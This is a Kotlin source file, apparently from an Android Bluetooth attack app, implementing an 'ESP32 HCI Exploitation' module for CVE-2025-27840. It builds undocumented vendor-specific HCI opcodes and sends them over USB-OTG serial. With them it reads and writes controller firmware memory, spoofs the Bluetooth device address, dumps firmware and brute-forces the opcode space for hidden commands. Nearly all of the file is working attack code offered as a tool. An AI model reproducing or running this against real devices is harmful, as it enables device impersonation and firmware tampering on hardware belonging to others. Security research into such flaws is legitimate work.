package com.hereliesaz.blusnu.data

import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Enum representing the undocumented vendor-specific HCI commands available
 * on ESP32 chips (CVE-2025-27840).
 *
 * Each command maps to a vendor-specific OGF (0x3F) with a unique OCF.
 * These commands are not documented in the ESP32 public API and provide
 * low-level access to the Bluetooth controller firmware.
 *
 * @property displayName Human-readable label for the UI.
 * @property description Brief explanation of what the command does.
 * @property ogf Opcode Group Field (always 0x3F for vendor-specific).
 * @property ocf Opcode Command Field unique to this command.
 */
enum class Esp32HciCommand(
    val displayName: String,
    val description: String,
    val ogf: Int,
    val ocf: Int
) {
    READ_MEMORY(
        displayName = "Read Memory",
        description = "Read firmware memory at a specified address and length.",
        ogf = 0x3F,
        ocf = 0x01
    ),
    WRITE_MEMORY(
        displayName = "Write Memory",
        description = "Write data to firmware memory at a specified address.",
        ogf = 0x3F,
        ocf = 0x02
    ),
    SPOOF_BDADDR(
        displayName = "Spoof BD_ADDR",
        description = "Change the Bluetooth device address on the ESP32 controller.",
        ogf = 0x3F,
        ocf = 0x03
    ),
    DUMP_FIRMWARE(
        displayName = "Dump Firmware",
        description = "Dump a region of the ESP32 firmware for offline analysis.",
        ogf = 0x3F,
        ocf = 0x04
    ),
    SCAN_VENDOR_CMDS(
        displayName = "Scan Vendor Commands",
        description = "Discover undocumented HCI vendor-specific commands on the ESP32.",
        ogf = 0x3F,
        ocf = 0x05
    );

    /**
     * Builds the full HCI opcode from OGF and OCF.
     * HCI opcode format: (OGF << 10) | OCF
     */
    fun opcode(): Int = (ogf shl 10) or ocf

    /**
     * Returns the opcode as a hex string for serial transmission.
     */
    fun opcodeHex(): String = "0x%04X".format(opcode())
}

/**
 * Module for ESP32 HCI Exploitation (CVE-2025-27840).
 *
 * ESP32 chips contain 29 undocumented vendor-specific HCI commands including
 * memory read/write capabilities. This module sends those commands to an ESP32
 * target via USB-OTG serial, enabling device spoofing, persistent firmware
 * modification, and analysis of the Bluetooth controller firmware.
 *
 * Requires USB-OTG connection to the target ESP32; HCI commands are sent via
 * serial through the [HardwareManager].
 *
 * Targets: BR/EDR + BLE (HCI / Firmware layer).
 *
 * @property hardwareManager Interface to the USB-OTG connected ESP32 hardware.
 */
class Esp32HciModule(private val hardwareManager: HardwareManager) {

    companion object {
        private const val TAG = "Esp32HciModule"

        /** Timeout waiting for an HCI event response from the ESP32. */
        private const val HCI_RESPONSE_TIMEOUT_MS = 10_000L

        /** Timeout for firmware dump operations which transfer more data. */
        private const val DUMP_TIMEOUT_MS = 30_000L

        /** Timeout for vendor command scanning which probes multiple OCFs. */
        private const val SCAN_TIMEOUT_MS = 60_000L

        /** Default memory read length in bytes. */
        private const val DEFAULT_READ_LENGTH = "256"

        /** Default firmware dump start address. */
        private const val DEFAULT_DUMP_ADDRESS = "0x40000000"

        /** Default firmware dump size in bytes. */
        private const val DEFAULT_DUMP_SIZE = "4096"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var commandJob: Job? = null

    /**
     * Checks whether the USB-OTG hardware is connected and ready for HCI commands.
     *
     * @return true if the hardware is in a connected state.
     */
    fun isHardwareConnected(): Boolean {
        val state = hardwareManager.hardwareState.value
        return state == HardwareState.CONNECTED_BTLEJACK ||
                state == HardwareState.CONNECTED_DUAL
    }

    /**
     * Executes a vendor-specific HCI command on the connected ESP32.
     *
     * Sends the command via [HardwareManager.sendCommand] using vendor-specific
     * OGF/OCF encoding, then parses HCI event responses from
     * [HardwareManager.deviceLogs].
     *
     * @param command The [Esp32HciCommand] to execute.
     * @param params Command-specific parameters (e.g., "address", "length", "data", "mac").
     * @return A [Flow] emitting progress logs and results as strings.
     */
    fun executeCommand(
        command: Esp32HciCommand,
        params: Map<String, String> = emptyMap()
    ): Flow<String> = flow {
        if (!isHardwareConnected()) {
            emit("ERROR: No ESP32 hardware connected via USB-OTG.")
            emit("Connect an ESP32 device and retry.")
            return@flow
        }

        emit("=== ESP32 HCI Exploitation ===")
        emit("Command: ${command.displayName}")
        emit("Opcode: ${command.opcodeHex()} (OGF=0x${"%02X".format(command.ogf)}, OCF=0x${"%02X".format(command.ocf)})")
        emit("")

        when (command) {
            Esp32HciCommand.READ_MEMORY -> executeReadMemory(params)
            Esp32HciCommand.WRITE_MEMORY -> executeWriteMemory(params)
            Esp32HciCommand.SPOOF_BDADDR -> executeSpoofBdAddr(params)
            Esp32HciCommand.DUMP_FIRMWARE -> executeDumpFirmware(params)
            Esp32HciCommand.SCAN_VENDOR_CMDS -> executeScanVendorCmds()
        }

        emit("")
        emit("=== Command Complete ===")
    }

    /**
     * Reads firmware memory at the specified address and length.
     *
     * Parameters:
     * - "address": Memory address to read from (hex string, e.g. "0x3FFB0000")
     * - "length": Number of bytes to read (decimal string, default "256")
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeReadMemory(
        params: Map<String, String>
    ) {
        val address = params["address"]
        if (address.isNullOrBlank()) {
            emit("ERROR: 'address' parameter required for READ_MEMORY.")
            emit("Provide a hex address, e.g. address=0x3FFB0000")
            return
        }

        val length = params["length"] ?: DEFAULT_READ_LENGTH
        emit("Reading $length bytes from address $address...")

        val hciCmd = "hci_vendor_cmd ${Esp32HciCommand.READ_MEMORY.opcodeHex()} $address $length"
        hardwareManager.sendCommand(hciCmd)

        val response = withTimeoutOrNull(HCI_RESPONSE_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("read_memory", ignoreCase = true) ||
                logLine.contains("mem_data", ignoreCase = true) ||
                logLine.contains("error", ignoreCase = true) ||
                logLine.contains("complete", ignoreCase = true)
            }
        }

        if (response == null) {
            emit("TIMEOUT: No response from ESP32 within ${HCI_RESPONSE_TIMEOUT_MS}ms.")
            emit("Verify the ESP32 is running and the USB-OTG connection is stable.")
        } else {
            emit("Response: $response")
            parseHciEventData(response)
        }
    }

    /**
     * Writes data to firmware memory at the specified address.
     *
     * Parameters:
     * - "address": Memory address to write to (hex string)
     * - "data": Hex-encoded data to write (e.g. "DEADBEEF")
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeWriteMemory(
        params: Map<String, String>
    ) {
        val address = params["address"]
        if (address.isNullOrBlank()) {
            emit("ERROR: 'address' parameter required for WRITE_MEMORY.")
            return
        }

        val data = params["data"]
        if (data.isNullOrBlank()) {
            emit("ERROR: 'data' parameter required for WRITE_MEMORY.")
            emit("Provide hex-encoded data, e.g. data=DEADBEEF")
            return
        }

        emit("Writing ${data.length / 2} bytes to address $address...")
        emit("Data: $data")

        val hciCmd = "hci_vendor_cmd ${Esp32HciCommand.WRITE_MEMORY.opcodeHex()} $address $data"
        hardwareManager.sendCommand(hciCmd)

        val response = withTimeoutOrNull(HCI_RESPONSE_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("write_memory", ignoreCase = true) ||
                logLine.contains("write_complete", ignoreCase = true) ||
                logLine.contains("error", ignoreCase = true) ||
                logLine.contains("complete", ignoreCase = true)
            }
        }

        if (response == null) {
            emit("TIMEOUT: No write confirmation from ESP32.")
        } else {
            emit("Response: $response")
            if (response.contains("error", ignoreCase = true)) {
                emit("WRITE FAILED: The ESP32 rejected the write operation.")
            } else {
                emit("Write operation completed successfully.")
            }
        }
    }

    /**
     * Spoofs the Bluetooth device address (BD_ADDR) on the ESP32 controller.
     *
     * Parameters:
     * - "mac": The new BD_ADDR to set (e.g. "AA:BB:CC:DD:EE:FF")
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeSpoofBdAddr(
        params: Map<String, String>
    ) {
        val mac = params["mac"]
        if (mac.isNullOrBlank()) {
            emit("ERROR: 'mac' parameter required for SPOOF_BDADDR.")
            emit("Provide a MAC address, e.g. mac=AA:BB:CC:DD:EE:FF")
            return
        }

        // Basic MAC format validation
        val macRegex = Regex("^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
        if (!macRegex.matches(mac)) {
            emit("ERROR: Invalid MAC address format: $mac")
            emit("Expected format: AA:BB:CC:DD:EE:FF")
            return
        }

        emit("Spoofing BD_ADDR to $mac...")
        val macBytes = mac.replace(":", "")

        val hciCmd = "hci_vendor_cmd ${Esp32HciCommand.SPOOF_BDADDR.opcodeHex()} $macBytes"
        hardwareManager.sendCommand(hciCmd)

        val response = withTimeoutOrNull(HCI_RESPONSE_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("bdaddr", ignoreCase = true) ||
                logLine.contains("address_changed", ignoreCase = true) ||
                logLine.contains("spoof", ignoreCase = true) ||
                logLine.contains("error", ignoreCase = true) ||
                logLine.contains("complete", ignoreCase = true)
            }
        }

        if (response == null) {
            emit("TIMEOUT: No confirmation of BD_ADDR change.")
        } else {
            emit("Response: $response")
            if (response.contains("error", ignoreCase = true)) {
                emit("SPOOF FAILED: The ESP32 rejected the address change.")
            } else {
                emit("BD_ADDR spoofed to $mac.")
                emit("NOTE: The change persists until the ESP32 is reset.")
            }
        }
    }

    /**
     * Dumps a region of ESP32 firmware for offline analysis.
     *
     * Parameters:
     * - "address": Start address for the dump (hex string, default "0x40000000")
     * - "size": Number of bytes to dump (decimal string, default "4096")
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeDumpFirmware(
        params: Map<String, String>
    ) {
        val address = params["address"] ?: DEFAULT_DUMP_ADDRESS
        val size = params["size"] ?: DEFAULT_DUMP_SIZE

        emit("Dumping $size bytes of firmware starting at $address...")
        emit("This may take a while for large regions.")

        val hciCmd = "hci_vendor_cmd ${Esp32HciCommand.DUMP_FIRMWARE.opcodeHex()} $address $size"
        hardwareManager.sendCommand(hciCmd)

        val response = withTimeoutOrNull(DUMP_TIMEOUT_MS) {
            hardwareManager.deviceLogs.first { logLine ->
                logLine.contains("dump_complete", ignoreCase = true) ||
                logLine.contains("firmware_data", ignoreCase = true) ||
                logLine.contains("error", ignoreCase = true) ||
                logLine.contains("complete", ignoreCase = true)
            }
        }

        if (response == null) {
            emit("TIMEOUT: Firmware dump did not complete within ${DUMP_TIMEOUT_MS}ms.")
            emit("Try a smaller region size or verify connection stability.")
        } else {
            emit("Response: $response")
            parseHciEventData(response)
        }
    }

    /**
     * Scans for undocumented vendor-specific HCI commands by probing OCF values
     * within the vendor-specific OGF (0x3F).
     *
     * Iterates through a range of OCF values and reports which ones return
     * a valid HCI event response rather than an "Unknown Command" error.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeScanVendorCmds() {
        emit("Scanning for undocumented vendor-specific HCI commands...")
        emit("Probing OGF=0x3F, OCF range 0x001-0x050...")
        emit("")

        var foundCount = 0

        for (ocf in 0x01..0x50) {
            val opcode = (0x3F shl 10) or ocf
            val opcodeHex = "0x%04X".format(opcode)

            val hciCmd = "hci_vendor_cmd $opcodeHex probe"
            hardwareManager.sendCommand(hciCmd)

            val response = withTimeoutOrNull(SCAN_TIMEOUT_MS / 80) {
                hardwareManager.deviceLogs.first { logLine ->
                    logLine.contains("vendor_cmd", ignoreCase = true) ||
                    logLine.contains("unknown", ignoreCase = true) ||
                    logLine.contains("error", ignoreCase = true) ||
                    logLine.contains("complete", ignoreCase = true) ||
                    logLine.contains("supported", ignoreCase = true)
                }
            }

            if (response != null && !response.contains("unknown", ignoreCase = true)) {
                foundCount++
                emit("  [FOUND] OCF=0x${"%02X".format(ocf)} Opcode=$opcodeHex -> $response")
            }
        }

        emit("")
        emit("Scan complete. Found $foundCount vendor-specific commands.")
        if (foundCount > 0) {
            emit("Use READ_MEMORY or DUMP_FIRMWARE to inspect command handlers.")
        }
    }

    /**
     * Parses HCI event data from a response string and emits formatted output.
     *
     * Attempts to extract hex data payloads from the response and format them
     * as a hex dump with ASCII representation.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.parseHciEventData(
        response: String
    ) {
        // Look for hex data patterns in the response
        val hexPattern = Regex("[0-9A-Fa-f]{2}(?:\\s[0-9A-Fa-f]{2})+")
        val matches = hexPattern.findAll(response)

        for (match in matches) {
            val hexBytes = match.value.split("\\s+".toRegex())
            if (hexBytes.size >= 4) {
                emit("Data (${hexBytes.size} bytes):")
                // Format as hex dump lines (16 bytes per line)
                hexBytes.chunked(16).forEachIndexed { index, chunk ->
                    val offset = "%04X".format(index * 16)
                    val hexPart = chunk.joinToString(" ") { it.uppercase() }
                    val asciiPart = chunk.joinToString("") { byte ->
                        val value = byte.toIntOrNull(16) ?: 0
                        if (value in 0x20..0x7E) value.toChar().toString() else "."
                    }
                    emit("  $offset: $hexPart  $asciiPart")
                }
            }
        }
    }

    /**
     * Stops any running command execution.
     */
    fun stop() {
        commandJob?.cancel()
        commandJob = null
        hardwareManager.sendCommand("stop")
        Log.d(TAG, "Command execution stopped.")
    }

    /**
     * Releases all resources: cancels any running commands, stops hardware,
     * and cancels the coroutine scope.
     */
    fun close() {
        stop()
        scope.cancel()
    }
}
